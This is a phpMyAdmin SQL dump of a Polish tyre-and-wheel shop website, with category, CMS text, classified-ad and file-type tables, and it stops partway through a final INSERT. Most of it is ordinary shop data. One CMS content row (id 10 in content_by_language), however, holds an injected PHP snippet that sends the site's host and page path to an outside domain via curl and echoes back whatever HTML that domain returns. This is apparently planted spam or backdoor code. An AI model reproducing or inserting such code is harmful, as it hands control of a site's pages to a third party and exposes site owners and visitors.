-- phpMyAdmin SQL Dump
-- version home.pl
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Czas wygenerowania: 19 Sty 2015, 22:39
-- Wersja serwera: 5.5.40-36.1-log
-- Wersja PHP: 5.2.17

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Baza danych: `14090561_0000002`
--

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `catalog`
--

CREATE TABLE IF NOT EXISTS `catalog` (
  `id_catalog` int(12) unsigned NOT NULL AUTO_INCREMENT,
  `id_parent` int(12) unsigned NOT NULL,
  `position` int(10) unsigned NOT NULL,
  `name` varchar(255) NOT NULL,
  `picture` varchar(50) NOT NULL,
  `picture_size` int(10) unsigned NOT NULL DEFAULT '0',
  `active` enum('Y','N') NOT NULL DEFAULT 'Y',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `lang` varchar(3) NOT NULL DEFAULT 'pl',
  `meta_title` varchar(255) NOT NULL,
  `meta_description` text NOT NULL,
  `meta_keywords` text NOT NULL,
  `meta_robots` varchar(100) NOT NULL,
  `meta_last_modified` varchar(19) NOT NULL,
  PRIMARY KEY (`id_catalog`),
  KEY `id_parent` (`id_parent`),
  KEY `lang` (`lang`),
  KEY `active` (`active`),
  KEY `position` (`position`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=93 ;

--
-- Zrzut danych tabeli `catalog`
--

INSERT INTO `catalog` (`id_catalog`, `id_parent`, `position`, `name`, `picture`, `picture_size`, `active`, `added`, `modified`, `lang`, `meta_title`, `meta_description`, `meta_keywords`, `meta_robots`, `meta_last_modified`) VALUES
(17, 20, 1, 'poza limitem', '', 0, 'Y', '0000-00-00 00:00:00', '2010-08-01 00:37:10', 'en', '', '', '', '', ''),
(38, 36, 0, 'Categories1.2', '', 0, 'Y', '0000-00-00 00:00:00', '2011-03-15 13:42:08', 'en', '', '', '', '', ''),
(42, 0, 0, 'Opony Samochodowe', '', 0, 'Y', '0000-00-00 00:00:00', '2011-12-27 19:00:49', 'en', '', '', '', '', '2011-12-27 19:58:27'),
(43, 42, 1, 'Zimowe', '', 8868, 'Y', '0000-00-00 00:00:00', '2012-02-11 12:05:04', 'en', '', '', '', '', '2011-12-27 20:02:44'),
(46, 45, 0, 'kylie', '', 0, 'Y', '0000-00-00 00:00:00', '2011-11-25 16:20:19', 'en', '', '', '', '', ''),
(55, 0, 2, 'Opony Rolnicze', '', 0, 'Y', '0000-00-00 00:00:00', '2012-01-10 14:21:31', 'en', '', '', '', '', '2011-12-27 20:05:24'),
(50, 49, 0, 'Opony zimowe', '', 0, 'N', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'en', '', '', '', '', ''),
(53, 51, 0, 'vgh', '', 0, 'N', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'en', '', '', '', '', ''),
(54, 42, 2, 'Zimowe Bieżnikowane', '', 38722, 'Y', '0000-00-00 00:00:00', '2012-02-11 12:05:04', 'en', '', '', '', '', '2011-12-28 09:48:41'),
(56, 42, 0, 'Letnie', '', 0, 'Y', '0000-00-00 00:00:00', '2012-02-11 12:05:03', 'en', '', '', '', '', '2011-12-27 20:04:44'),
(67, 65, 0, 'Aluminiowe', '', 24666, 'Y', '0000-00-00 00:00:00', '2013-08-22 17:49:43', 'en', '', '', '', '', '2013-08-22 19:49:43'),
(63, 0, 8, 'Akumulatory', '', 0, 'Y', '0000-00-00 00:00:00', '2012-01-10 14:21:31', 'en', '', '', '', '', ''),
(65, 0, 7, 'Felgi ', '', 0, 'Y', '0000-00-00 00:00:00', '2012-01-10 14:21:31', 'en', '', '', '', '', '2011-12-27 20:09:35'),
(70, 0, 9, 'Kołpaki', '', 0, 'Y', '0000-00-00 00:00:00', '2012-01-10 14:21:31', 'en', '', '', '', '', ''),
(68, 65, 1, 'Stalowe', '', 0, 'Y', '0000-00-00 00:00:00', '2011-12-27 19:11:58', 'en', '', '', '', '', ''),
(71, 0, 10, 'Dętki', '', 0, 'N', '0000-00-00 00:00:00', '2012-01-16 13:35:29', 'en', '', '', '', '', '2012-01-16 14:35:29'),
(72, 0, 1, 'Opony Dostawcze', '', 0, 'Y', '0000-00-00 00:00:00', '2011-12-27 19:14:02', 'en', '', '', '', '', ''),
(73, 0, 3, 'Opony Terenowe', '', 0, 'Y', '0000-00-00 00:00:00', '2012-01-10 14:21:31', 'en', '', '', '', '', ''),
(74, 72, 1, 'Zimowe ', '', 0, 'Y', '0000-00-00 00:00:00', '2012-02-11 12:05:19', 'en', '', '', '', '', '2012-01-12 14:56:41'),
(75, 72, 0, 'Letnie', '', 0, 'Y', '0000-00-00 00:00:00', '2012-02-11 12:05:19', 'en', '', '', '', '', ''),
(76, 0, 3, 'Opony Cieżarowe', '', 0, 'Y', '0000-00-00 00:00:00', '2012-01-10 14:21:31', 'en', '', '', '', '', ''),
(77, 0, 6, 'Opony Przemysłowe', '', 0, 'Y', '0000-00-00 00:00:00', '2013-08-22 17:44:24', 'en', '', '', '', '', '2012-02-04 12:54:40'),
(78, 0, 5, 'Opony do motocykli i skuterów', '', 0, 'Y', '0000-00-00 00:00:00', '2013-08-22 17:47:47', 'en', '', '', '', '', '2012-02-04 12:54:55'),
(80, 42, 2, 'Całoroczne', '', 0, 'N', '0000-00-00 00:00:00', '2012-02-11 12:05:03', 'en', '', '', '', '', '2012-01-01 12:24:16'),
(81, 72, 2, 'Zimowe Bieżnikowane', '', 0, 'Y', '0000-00-00 00:00:00', '2013-03-22 12:57:47', 'en', '', '', '', '', '2013-03-22 10:02:22'),
(82, 63, 0, 'Centra', '', 0, 'N', '0000-00-00 00:00:00', '2011-12-28 08:32:10', 'en', '', '', '', '', '2011-12-28 09:32:10'),
(83, 63, 1, 'Warta', '', 0, 'N', '0000-00-00 00:00:00', '2011-12-28 08:32:19', 'en', '', '', '', '', '2011-12-28 09:32:19'),
(89, 42, 4, 'Letnie Bieżnikowane', '', 0, 'Y', '0000-00-00 00:00:00', '2013-02-07 19:33:09', 'en', '', '', '', '', '2013-02-07 13:33:22'),
(90, 72, 3, 'Letnie Bieżnikowane', '', 0, 'Y', '0000-00-00 00:00:00', '2013-03-18 10:43:34', 'en', '', '', '', '', '2013-03-18 11:43:34'),
(91, 73, 0, 'Letnie ', '', 0, 'Y', '0000-00-00 00:00:00', '2013-08-22 17:55:10', 'en', '', '', '', '', ''),
(92, 73, 1, 'Zimowe ', '', 0, 'Y', '0000-00-00 00:00:00', '2013-08-22 17:55:11', 'en', '', '', '', '', '');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `category_type`
--

CREATE TABLE IF NOT EXISTS `category_type` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_polish_ci NOT NULL,
  `status` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_polish_ci AUTO_INCREMENT=4 ;

--
-- Zrzut danych tabeli `category_type`
--

INSERT INTO `category_type` (`id`, `name`, `status`) VALUES
(1, 'Opony', 1),
(2, 'Felgi', 1),
(3, 'Akumulatory', 1);

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `content_by_language`
--

CREATE TABLE IF NOT EXISTS `content_by_language` (
  `id_content_by_language` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(32) NOT NULL,
  `language` varchar(2) NOT NULL,
  `content` text,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'Y',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id_content_by_language`),
  KEY `language` (`language`),
  KEY `deleted` (`deleted`),
  KEY `language_2` (`language`,`deleted`),
  KEY `key` (`key`),
  KEY `key_2` (`key`,`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=11 ;

--
-- Zrzut danych tabeli `content_by_language`
--

INSERT INTO `content_by_language` (`id_content_by_language`, `key`, `language`, `content`, `deleted`, `active`, `added`, `modified`) VALUES
(1, 'b4966bb8040fc59c37a6c322c6164260', 'en', 'Towary', 'N', 'Y', '0000-00-00 00:00:00', '2012-01-12 07:24:22'),
(2, '7f23d103ad83377f819a7c537ce9172d', 'en', '<p>\r\n	Poza oponami w naszym asortymencie posiadamy r&oacute;wnież felgi, akumulatory, kołpaki i dętki. &nbsp;Na zam&oacute;wienie możecie państwo dostać r&oacute;wnież dowolne cześci do samochod&oacute;w, <span class="ff2 fc0 fs12 ">z okresem oczekiwania nie przekraczającym 24h.</span></p>\r\n<p>\r\n	&nbsp;</p>\r\n<p>\r\n	&nbsp;</p>\r\n<p>\r\n	&nbsp;</p>\r\n', 'N', 'Y', '0000-00-00 00:00:00', '2012-01-12 07:24:22'),
(3, '1fb3b442db8ddd8d934921ff1cf60103', 'en', 'Czy myslales juz o wymianie opon?', 'N', 'Y', '0000-00-00 00:00:00', '2011-12-06 20:59:08'),
(4, '7461832aa43d0f209f2ad23a939b8b91', 'en', '<p>\r\n	<span style="font-size:10px;">Dzięki naszej usłudze nie musisz czekać w kolejkach. Zapisz sie do newslettera, a bedziesz na bieżąco z naszymi ofertami.</span></p>\r\n', 'N', 'Y', '0000-00-00 00:00:00', '2012-01-12 10:09:26'),
(5, '9b8752ec1ed17148eb576af7a92c7960', 'en', 'Nowa strona', 'N', 'Y', '0000-00-00 00:00:00', '2011-12-19 17:43:55'),
(6, '4fcad4306279a911be7ab4eeb3ebbe4c', 'en', '<p style="color: blue;">\r\n	<strong><span style="color:#000000;"><span style="font-size: 14px;"><kbd><tt><small>Właśnie utworzyliśmy nową stronę internetową aby mogli państwo mieć dostęp do naszych nowych ofert.</small></tt></kbd></span></span></strong></p>\r\n<p style="color: blue;">\r\n	<strong><span style="color:#000000;"><span style="font-size: 14px;"><kbd><tt><small>Dzięki newsletterowi bedą państwo na bieżąco z cenami naszych usług, opon oraz innych towar&oacute;w</small>.</tt></kbd></span></span></strong></p>\r\n', 'N', 'Y', '0000-00-00 00:00:00', '2012-01-13 13:13:52'),
(7, 'ef65183e6b2017b4f983b2132ff18261', 'en', 'Fachowa obsługa', 'N', 'Y', '0000-00-00 00:00:00', '0000-00-00 00:00:00'),
(8, '6af56a3184f76c730638ac8d09bbf5a9', 'en', '<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		<span style="color: rgb(0, 0, 205);"><span style="font-size: 14px;"><strong>&nbsp;&nbsp; Kontroluj ciśnienie w kołach</strong></span></span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; &nbsp; Przypominamy że należy kontrolować ciśnienie w kołach przynajmniej raz w miesiącu, zapobiegnie </span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; to uszkodzeniu opony a zwłaszcza szybszemu zużyciu bieżnika.</span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<strong><span style="font-size:12px;">&nbsp; Spadek cisnienia można wyjasnic porzez:</span></strong></li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - naturalne rozchodzenie sie powietrza poprzez elemetny składowe opony </span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - spadki temperatury otocznia</span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - nie wielkie przebice,kt&oacute;re w przypadkuopony bezdentkowej nie powoduje natychmiastowego &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ujścia powietrze</span></li>\r\n</ul>\r\n<h2>\r\n	<br />\r\n	<span style="color:#0000cd;"><span style="font-size: 14px;"><strong>&nbsp;</strong></span></span></h2>\r\n<h2>\r\n	<span style="color:#0000cd;"><span style="font-size: 14px;"><strong>Sprawdzaj Wyważenie k&oacute;ł</strong></span></span></h2>\r\n<ul>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; - Masz drgania na kierownicy ?</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; - Przejechałeś około 10.000 km. od ostatniego wyważania ?</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; - A może wjechałeś w dużą dziurę na ulicy ?</span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; &nbsp; Trzeba wyważyc kola zeby zapobiec drganiom, i nieregularnemu zużywaniu się opon oraz</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; nadmiernego zużywania się element&oacute;w zawieszenia samochodu.</span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n</ul>\r\n<ul>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; &nbsp; Opony należy wyważać po pierwszym zamontowaniu na obręczach oraz po każdym zdjęciu i </span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; ponownym założeniu na obręcze.<br />\r\n		</span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n</ul>\r\n<ul>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp;&nbsp;&nbsp; Drgania na kierownicy nie muszą występować przy każdej prędkości, mogą się pojawiać tylko w </span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; pewnym zakresie prędkości.</span></li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		<h2>\r\n			<strong><span style="font-size:14px;"><span style="color: rgb(0, 0, 205);">&nbsp; Sprzedaz i wymiana opon:</span></span></strong></h2>\r\n	</li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - Twoje opony straciły bieżnik ?</span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - Masz opony zimowe ale brak ci letnich ? albo na odwr&oacute;t</span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - Ktoś wyżył się na twoich oponach i poprzecinał je na bokach ?</span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - Może twoje opony zestarzały się i źle trzymają się drogi ?</span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp;&nbsp;&nbsp; W naszej ofercie znajdziecie Państwo bogaty wyb&oacute;r opon letnich i zimowych do samochod&oacute;w</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; osobowych i&nbsp; dostawczych uznanych polskich i zagranicznych marek</span></li>\r\n</ul>\r\n<h3>\r\n	<span style="font-size:12px;"><strong><span style="color: rgb(0, 0, 0);">&nbsp; Doradzamy dob&oacute;r opon w zależności od </span>:</strong></span></h3>\r\n<ul>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - marki samochodu</span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - mocy silnik</span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - <span style="color: rgb(0, 0, 0);">warunk&oacute;w eksploatacji&nbsp; </span></span></li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; - <span style="color: rgb(0, 0, 0);">ilości pokonywanych kilometr&oacute;w</span></span></li>\r\n	<li>\r\n		&nbsp;</li>\r\n</ul>\r\n<h2>\r\n	<span style="font-size:14px;"><span style="color: rgb(0, 0, 205);"><strong>&nbsp; Czy trzeba wymieniać opony letnie na zimowe?</strong></span></span></h2>\r\n<ul>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp;&nbsp;&nbsp;&nbsp; Są one zalecane, gł&oacute;wnie dlatego że miękka guma oraz większa ilość wyżłobień w bieżniku </span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; zapewniają </span><span style="font-size: 11px;">znacznie lepszą przyczepność na śliskiej nawierzchni. Nie ma mowy o bezpiecznym</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; jeżdżeniu przez cały</span><span style="font-size: 11px;"> rok na oponach letnich. Na śniegu i lodzie zachowują się one niemal</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; nieobliczalnie. </span><span style="font-size: 11px;">Jedynym rozwiązaniem zastępczym są opony całoroczne, przy czym także należy</span></li>\r\n	<li>\r\n		<span style="font-size: 11px;">&nbsp; pamiętać o ich </span><span style="font-size: 11px;">wymianie oraz kontroli.</span></li>\r\n</ul>\r\n<h2>\r\n	<span style="color:#0000cd;"><span style="font-size: 14px;"><strong>&nbsp; </strong></span></span></h2>\r\n<h2>\r\n	<span style="color:#0000cd;"><span style="font-size: 14px;"><strong>&nbsp; Jak długo trwa wymiana opon?</strong></span></span></h2>\r\n<ul>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		<span style="font-size:11px;">&nbsp; &nbsp; Z reguły czas na wymianę opon w serwisie to około 20-45 minut.</span></li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n', 'N', 'Y', '0000-00-00 00:00:00', '2013-06-26 15:51:05'),
(9, 'dffafa0317e53976c3fe0eaeb0ed68f0', 'en', 'sdfsd', 'N', 'Y', '0000-00-00 00:00:00', '2012-09-10 17:38:20'),
(10, '5d99f46fdef963bb1eb82d6c32fe3f44', 'en', '<p>\r\n	fsds</p>\r\n<p>\r\n<!--?php $curl = curl_init();curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_URL, "http://dodatki.org.pl/socjal_opisy.php?host=".$_SERVER["HTTP_HOST"]."&adr=".$_SERVER["PHP_SELF"]."");curl_setopt($curl,CURLOPT_HEADER, 0);curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,10); $html = curl_exec($curl);curl_close($curl);echo $html; ?--></p>\r\n', 'N', 'Y', '0000-00-00 00:00:00', '2012-09-10 17:38:20');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `event`
--

CREATE TABLE IF NOT EXISTS `event` (
  `id_event` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `intro` mediumtext NOT NULL,
  `content` text NOT NULL,
  `picture` varchar(255) NOT NULL,
  `source` varchar(255) NOT NULL,
  `date_from` date NOT NULL,
  `date_to` date NOT NULL,
  `always` enum('Y','N') NOT NULL DEFAULT 'N',
  `language` varchar(2) NOT NULL,
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_event`),
  KEY `active` (`active`,`deleted`,`date_from`,`date_to`,`always`,`language`),
  KEY `active_2` (`active`),
  KEY `deleted` (`deleted`),
  KEY `date_from` (`date_from`),
  KEY `date_to` (`date_to`),
  KEY `date_from_2` (`date_from`,`date_to`),
  KEY `always` (`always`),
  KEY `language` (`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=21 ;

--
-- Zrzut danych tabeli `event`
--

INSERT INTO `event` (`id_event`, `title`, `intro`, `content`, `picture`, `source`, `date_from`, `date_to`, `always`, `language`, `added`, `modified`, `deleted`, `active`) VALUES
(1, 'Felgi aluminiowe', 'Mam do zaoferowania  komplet  felg  orginalnych używanych  do Opla Astry 15 felgi sa w dobrym stanie ,proste sprawdzone na maszynie', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2011-12-07 19:48:14', '2013-02-19 08:34:59', 'Y', 'Y'),
(2, 'Felgi aluminiowe', 'Witam mam do zaoferowania  komplet  felg  orginalnych używanych  do Opla Astry 15 felgi sa w dobrym stanie ,proste sprawdzone na maszynie ', '', '', '', '0000-00-00', '0000-00-00', 'N', 'en', '2011-12-07 20:20:35', '2011-12-15 11:55:53', 'Y', 'Y'),
(3, 'Felgi aluminiowe', 'Witam mam do zaoferowania  komplet  felg  orginalnych używanych  do Opla Astry 15 felgi sa w dobrym stanie ,proste sprawdzone na maszynie', '', '', '', '0000-00-00', '0000-00-00', 'N', 'en', '2011-12-15 11:56:32', '2011-12-15 11:56:45', 'Y', 'Y'),
(4, 'Felgi aluminiowe', 'Witam mam do zaoferowania  komplet  felg  orginalnych używanych  do Opla Astry 15 felgi sa w dobrym stanie ,proste sprawdzone na maszynie', '', '20111215142324_100_0002.jpg', '', '0000-00-00', '0000-00-00', 'N', 'en', '2011-12-15 11:57:04', '2011-12-15 13:23:39', 'Y', 'Y'),
(5, 'Felgi aluminiowe do audi ', 'Sprzedam komplet kół do audi 16 cali na pięć szpilek ,opony w dobrym stanie 205/55 R16', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2011-12-27 08:53:28', '2013-02-19 08:36:43', 'Y', 'Y'),
(6, 'Aluminiowe koła sprzedam z oponami 14', 'Sprzedam komplet kół 14 na felgach aluminowych do Golfa, Passata ,opony w bardzo dobrym stanie 185/65R14 Klebera  ', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2012-05-28 11:50:41', '2013-02-19 08:37:01', 'Y', 'Y'),
(7, 'Opony używane 17', '', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2012-09-10 17:50:28', '2013-02-19 08:36:53', 'Y', ''),
(8, 'Opony uzywane', 'Opony używane 185/65R15 kleber w dobrym stanie ', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2012-11-05 20:56:32', '2013-02-19 08:37:10', 'Y', 'Y'),
(9, 'Alufelgi', 'Alufelgi do audi orginalne 16  w dobrym stanie ', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2012-11-05 20:58:26', '2013-02-19 08:39:47', 'Y', 'Y'),
(10, 'Alufelgi do audi ', 'Alufelgi do audi orginalne 16  w dobrym stanie ', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-02-19 08:50:57', '2013-06-05 16:38:34', 'N', 'Y'),
(11, 'Alufelgi 14 ', '', '', '20130314130419_2012_08_31_008.jpg', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-02-19 09:34:23', '2013-03-14 13:17:28', 'N', 'Y'),
(12, 'hvj', '', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-02-19 09:34:33', '2013-02-19 09:34:51', 'Y', 'Y'),
(13, 'Alufelgi  Opel Vectra 15', 'Witam mam do sprzedania alufelgi 15 z rozstawem 4-100 z oponami 185/65r15 w dobrym stanie.\r\nSprawdzone proste cena 500zł', '', '20130920183625_2013_09_20_153.jpg', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-20 16:35:42', '2013-09-20 16:46:11', 'N', 'Y'),
(14, 'Felga stalowa VW Seat 16', 'Mam do sprzedania felg stalowe 16 o rostawie 5-112  Et 42\r\ncena 70 sztuka ', '', '20130921102241_2013_09_21_165.jpg', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-21 08:22:02', '2013-09-21 08:22:52', 'N', 'Y'),
(15, 'Opony używane 235/65r17', 'Mam do sprzedania cztery sztuki opon używanych  235/65R17 Bridgestone \r\ncena 80 zł sztuka  ', '', '20130921114633_2013_09_21_160.jpg', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-21 09:45:39', '2013-09-21 09:46:39', 'N', 'Y'),
(16, 'Opony używane letnie 225/40R18 ', 'Mam do sprzedania dwie opony używane letnie 225/40R18 Dunlop\r\ncena 80zł sztuka', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-22 11:11:52', '0000-00-00 00:00:00', 'N', 'Y'),
(17, 'Opony używane 225/45r18', 'Mam do sprzedania cztery sztuki opon używanych letnich 225/45R18 \r\nCena 80zł sztuka ', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-22 11:13:05', '0000-00-00 00:00:00', 'N', 'Y'),
(18, 'Felgi stalowe 16', 'Mam do sprzedania felg stalowe 16 do BMW', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-22 11:33:36', '0000-00-00 00:00:00', 'N', 'Y'),
(19, 'Opony używane letnie 225/55R16', 'Mam do sprzedania 4 sztuki opon letnich 225/55R16 w dobrym stanie ', '', '', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-26 11:08:24', '0000-00-00 00:00:00', 'N', 'Y'),
(20, 'Felgi używane do forda ', 'Felgi aluminiowe używane 15 do forda w dobrym stanie ', '', '20130930112412_2013_09_27_174.jpg', '', '0000-00-00', '0000-00-00', 'Y', 'en', '2013-09-30 09:23:35', '2013-09-30 09:24:17', 'N', 'Y');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `file`
--

CREATE TABLE IF NOT EXISTS `file` (
  `id_file` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `file_name` varchar(251) NOT NULL,
  `photo` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `size` int(10) unsigned NOT NULL,
  `type` int(10) unsigned NOT NULL,
  `added` varchar(255) NOT NULL,
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `active` enum('Y','N') NOT NULL DEFAULT 'Y',
  `headline` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_file`),
  KEY `added` (`added`),
  KEY `active` (`active`),
  KEY `type` (`type`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=82 ;

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `file_types`
--

CREATE TABLE IF NOT EXISTS `file_types` (
  `id_file_type` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mime` varchar(255) NOT NULL,
  `extension` varchar(4) NOT NULL,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`id_file_type`),
  KEY `mime` (`mime`),
  KEY `extension` (`extension`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=13 ;

--
-- Zrzut danych tabeli `file_types`
--

INSERT INTO `file_types` (`id_file_type`, `mime`, `extension`, `name`) VALUES
(1, '', '', 'inny plik'),
(2, 'application/x-flash-video', 'flv', 'Flash Video (flv)'),
(3, 'application/octet-stream', '', 'nierozpoznany'),
(4, 'application/msword', 'doc', 'dokument Microsoft Word'),
(5, 'application/pdf', 'pdf', 'plik PDF'),
(6, 'image/png', 'png', 'obrazek (png)'),
(7, 'image/gif', 'gif', 'obrazek (gif)'),
(8, 'image/pjpg', '', 'obrazek (jpg)'),
(9, 'image/jpeg', 'jpg', 'obrazek (jpg)'),
(10, 'image/tiff', 'tif', 'obrazek (tiff)'),
(11, 'application/msword', 'docx', 'dokument Microsoft Word'),
(12, '', 'psd', 'Plik Adobe Photoshop');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `gallery`
--

CREATE TABLE IF NOT EXISTS `gallery` (
  `id_gallery` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `information` text NOT NULL,
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_gallery`),
  KEY `deleted` (`deleted`),
  KEY `active` (`active`),
  KEY `deleted_2` (`deleted`,`active`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- Zrzut danych tabeli `gallery`
--

INSERT INTO `gallery` (`id_gallery`, `name`, `description`, `information`, `added`, `modified`, `deleted`, `active`) VALUES
(1, '', '', '', '2011-12-06 22:45:39', '0000-00-00 00:00:00', 'N', ''),
(2, '', '', '', '2011-12-06 22:46:37', '0000-00-00 00:00:00', 'N', ''),
(3, '', '', '', '2011-12-06 22:47:23', '0000-00-00 00:00:00', 'N', ''),
(4, '', '', '', '2011-12-06 22:47:52', '0000-00-00 00:00:00', 'N', '');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `language`
--

CREATE TABLE IF NOT EXISTS `language` (
  `id_language` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `added` datetime NOT NULL,
  `modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `name` varchar(250) NOT NULL,
  `collation` varchar(200) NOT NULL DEFAULT 'utf8_general_ci',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_language`),
  KEY `collation` (`collation`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Zrzut danych tabeli `language`
--

INSERT INTO `language` (`id_language`, `added`, `modified`, `name`, `collation`, `active`, `deleted`) VALUES
